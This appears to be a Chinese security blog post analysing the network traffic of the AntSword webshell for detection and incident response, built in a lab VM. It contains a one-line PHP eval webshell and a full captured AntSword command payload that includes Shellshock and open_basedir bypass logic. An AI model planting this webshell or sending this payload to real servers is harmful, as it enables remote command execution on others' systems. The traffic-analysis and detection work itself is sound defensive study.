---
title: "蚁剑流量分析和溯源"
description: "Webshell分析---蚁剑流量分析和溯源"
date: 2024-01-15
tags:
  - "webshell"
  - "蚁剑"
  - "流量分析"
  - "应急响应"
authors:
  - "bx"
draft: false
slug: "k8x9w22"
---

<meta name="referrer" content="no-referrer">



# 蚁剑流量分析和溯源

## 环境配置

:::info
采用的是 Ubuntu 虚拟机 加上 window + wireshark 的方式

:::

这里采用的桥连接

主要是配个 apache+php 环境

```bash
sudo apt update
sudo apt install apache2 -y
sudo apt install php libapache2-mod-php -y
sudo systemctl restart apache2
```

创建一个 PHP 漏洞

```bash
echo "<?php @eval(\$_POST['ant']); ?>" | sudo tee /var/www/html/shell.php
```

可以命令行查看 ip

```bash
ip addr
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744732099048-bd7444f5-55ef-4c0c-a0ca-ad982160e3ca.png)

打开 wireshark，，规则捕捉 VMnet8

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744734750519-523f287c-2618-4fe1-9b03-4fd1acad7df9.png)

打开 yijian

连接 Ubuntu 漏洞

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744734797818-575b20cc-9388-4414-a168-9d278ed44c44.png)

具体效果如下

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744734712242-33d40c25-6b4c-4dda-b6f9-d89653532ba0.png)



## 流量特征分析

### 总结

1. 每个请求都以“0”开头
2. 对于响应包来说，我们采用默认的话，就是额外字符加返回结果，查询结果是随机数 结果 随机数

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744733826623-0c816d10-6dd7-4578-87a6-374003b7788c.png)

3.  以 HTTP POST 请求为主  （这个其实都一样）
4.  请求体参数化，常带有随机键名  







### 测试过程

#### 执行命令

> 蚁剑与网站进行数据交互的过程中，发送的数据是经过编码器编码后再发送，支持的编码方式有default默认的、base64、chr、chr16、rot13；网站返回的数据经过解码器中的编码方式编码后返回，支持的编码方式有default、base64、rot13

解码和编码器都是 default

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744733250271-1ea78baf-75b0-4bd0-8e39-efc744098d63.png)

```bash
whoami
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744733204332-9836ef08-6a8a-4b55-8987-a3f283462ddc.png)

Wireshark 追踪 TCP 流

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744733135947-8521b612-3df9-4830-83df-05960e60f0bf.png)

```plain
ant=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24oparr%3Dpreg_split(base64_decode(%22Lzt8Oi8%3D%22)%2C%24opdir)%3B%40array_push(%24oparr%2C%24ocwd%2Csys_get_temp_dir())%3Bforeach(%24oparr%20as%20%24item)%20%7Bif(!%40is_writable(%24item))%7Bcontinue%3B%7D%3B%24tmdir%3D%24item.%22%2F.c27656278a11%22%3B%40mkdir(%24tmdir)%3Bif(!%40file_exists(%24tmdir))%7Bcontinue%3B%7D%24tmdir%3Drealpath(%24tmdir)%3B%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%20%22..%22)%3B%24cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24tmdir)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24cntarr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%3B%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24tmdir)%3Bbreak%3B%7D%3B%7D%3B%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%22fc689%22.%22900e3%22%3Becho%20%40asenc(%24output)%3Becho%20%2229eac8%22.%22fa1502%22%3B%7Dob_start()%3Btry%7B%24p%3Dbase64_decode(substr(%24_POST%5B%22k1ec9ed6804696%22%5D%2C2))%3B%24s%3Dbase64_decode(substr(%24_POST%5B%22k99eb9fde3781e%22%5D%2C2))%3B%24envstr%3D%40base64_decode(substr(%24_POST%5B%22ndb0b51fc34194%22%5D%2C2))%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24c%3Dsubstr(%24d%2C0%2C1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B%24s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B%24s%7D%5C%22%22%3Bif(substr(%24d%2C0%2C1)%3D%3D%22%2F%22)%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%7Delse%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%22%2C%20%24envstr)%3Bforeach(%24envarr%20as%20%24v)%20%7Bif%20(!empty(%24v))%20%7B%40putenv(str_replace(%22%7C%7C%7Caskey%7C%7C%7C%22%2C%20%22%3D%22%2C%20%24v))%3B%7D%7D%7D%24r%3D%22%7B%24p%7D%20%7B%24c%7D%22%3Bfunction%20fe(%24f)%7B%24d%3Dexplode(%22%2C%22%2C%40ini_get(%22disable_functions%22))%3Bif(empty(%24d))%7B%24d%3Darray()%3B%7Delse%7B%24d%3Darray_map('trim'%2Carray_map('strtolower'%2C%24d))%3B%7Dreturn(function_exists(%24f)%26%26is_callable(%24f)%26%26!in_array(%24f%2C%24d))%3B%7D%3Bfunction%20runshellshock(%24d%2C%20%24c)%20%7Bif%20(substr(%24d%2C%200%2C%201)%20%3D%3D%20%22%2F%22%20%26%26%20fe('putenv')%20%26%26%20(fe('error_log')%20%7C%7C%20fe('mail')))%20%7Bif%20(strstr(readlink(%22%2Fbin%2Fsh%22)%2C%20%22bash%22)%20!%3D%20FALSE)%20%7B%24tmp%20%3D%20tempnam(sys_get_temp_dir()%2C%20'as')%3Bputenv(%22PHP_LOL%3D()%20%7B%20x%3B%20%7D%3B%20%24c%20%3E%24tmp%202%3E%261%22)%3Bif%20(fe('error_log'))%20%7Berror_log(%22a%22%2C%201)%3B%7D%20else%20%7Bmail(%22a%40127.0.0.1%22%2C%20%22%22%2C%20%22%22%2C%20%22-bv%22)%3B%7D%7D%20else%20%7Breturn%20False%3B%7D%24output%20%3D%20%40file_get_contents(%24tmp)%3B%40unlink(%24tmp)%3Bif%20(%24output%20!%3D%20%22%22)%20%7Bprint(%24output)%3Breturn%20True%3B%7D%7Dreturn%20False%3B%7D%3Bfunction%20runcmd(%24c)%7B%24ret%3D0%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(fe('system'))%7B%40system(%24c%2C%24ret)%3B%7Delseif(fe('passthru'))%7B%40passthru(%24c%2C%24ret)%3B%7Delseif(fe('shell_exec'))%7Bprint(%40shell_exec(%24c))%3B%7Delseif(fe('exec'))%7B%40exec(%24c%2C%24o%2C%24ret)%3Bprint(join(%22%0A%22%2C%24o))%3B%7Delseif(fe('popen'))%7B%24fp%3D%40popen(%24c%2C'r')%3Bwhile(!%40feof(%24fp))%7Bprint(%40fgets(%24fp%2C2048))%3B%7D%40pclose(%24fp)%3B%7Delseif(fe('proc_open'))%7B%24p%20%3D%20%40proc_open(%24c%2C%20array(1%20%3D%3E%20array('pipe'%2C%20'w')%2C%202%20%3D%3E%20array('pipe'%2C%20'w'))%2C%20%24io)%3Bwhile(!%40feof(%24io%5B1%5D))%7Bprint(%40fgets(%24io%5B1%5D%2C2048))%3B%7Dwhile(!%40feof(%24io%5B2%5D))%7Bprint(%40fgets(%24io%5B2%5D%2C2048))%3B%7D%40fclose(%24io%5B1%5D)%3B%40fclose(%24io%5B2%5D)%3B%40proc_close(%24p)%3B%7Delseif(fe('antsystem'))%7B%40antsystem(%24c)%3B%7Delseif(runshellshock(%24d%2C%20%24c))%20%7Breturn%20%24ret%3B%7Delseif(substr(%24d%2C0%2C1)!%3D%22%2F%22%20%26%26%20%40class_exists(%22COM%22))%7B%24w%3Dnew%20COM('WScript.shell')%3B%24e%3D%24w-%3Eexec(%24c)%3B%24so%3D%24e-%3EStdOut()%3B%24ret.%3D%24so-%3EReadAll()%3B%24se%3D%24e-%3EStdErr()%3B%24ret.%3D%24se-%3EReadAll()%3Bprint(%24ret)%3B%7Delse%7B%24ret%20%3D%20127%3B%7Dreturn%20%24ret%3B%7D%3B%24ret%3D%40runcmd(%24r.%22%202%3E%261%22)%3Bprint%20(%24ret!%3D0)%3F%22ret%3D%7B%24ret%7D%22%3A%22%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&k1ec9ed6804696=spL2Jpbi9zaA%3D%3D&k99eb9fde3781e=zoY2QgIi92YXIvd3d3L2h0bWwiO3dob2FtaTtlY2hvIGE5MDA4YjM7cHdkO2VjaG8gYTczOGUzZGI%3D&ndb0b51fc34194=4z
```

先 url 解码，比如说我们对最后一个 base64 处理

```plain
zoY2QgIi92YXIvd3d3L2h0bWwiO3dob2FtaTtlY2hvIGE5MDA4YjM7cHdkO2VjaG8gYTczOGUzZGI%3D&ndb0b51fc34194=4z

# 删除前面的zo

Y2QgIi92YXIvd3d3L2h0bWwiO3dob2FtaTtlY2hvIGE5MDA4YjM7cHdkO2VjaG8gYTczOGUzZGI
--->
cd "/var/www/html";whoami;echo a9008b3;pwd;echo a738e3db
```



#### chr 编码 + rot13 回显

> 其实总体来说，所以逻辑和格式都是一样的，就是发包和收包的编码格式不一样，我的理解是就是加一层编解码处理

情况如下

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744734231165-2395ca2c-b668-49aa-a25c-002eea005734.png)

rot13 回显如下

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744734390710-238abec6-a058-4f46-b096-f7ce8294b1bd.png)

解码如下

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744734426799-d4397a64-b4fd-40b5-a5a3-a98e6ecde36f.png)



## 附件

### rot13 解码脚本

```python
import codecs

def rot13_decode(text):
    try:
        decoded_text = codecs.decode(text, 'rot_13')
        return decoded_text
    except Exception as e:
        print(f"解码时发生错误: {e}")
        return None

if __name__ == "__main__":
    while True:
        encoded_text = input("请输入要进行 ROT13 解码的文本 (输入 'quit' 退出): ")
        if encoded_text.lower() == 'quit':
            break
        decoded_result = rot13_decode(encoded_text)

        if decoded_result is not None:
            print(f"ROT13 解码结果: {decoded_result}\n")
    print("脚本已退出。")

def rot13_manual(text):
    result = []
    for char in text:
        char_code = ord(char)
        if 'A' <= char <= 'Z':
            new_code = ord('A') + (char_code - ord('A') + 13) % 26
            result.append(chr(new_code))
        elif 'a' <= char <= 'z':
            new_code = ord('a') + (char_code - ord('a') + 13) % 26
            result.append(chr(new_code))
        else:
            result.append(char)

    return "".join(result)

```

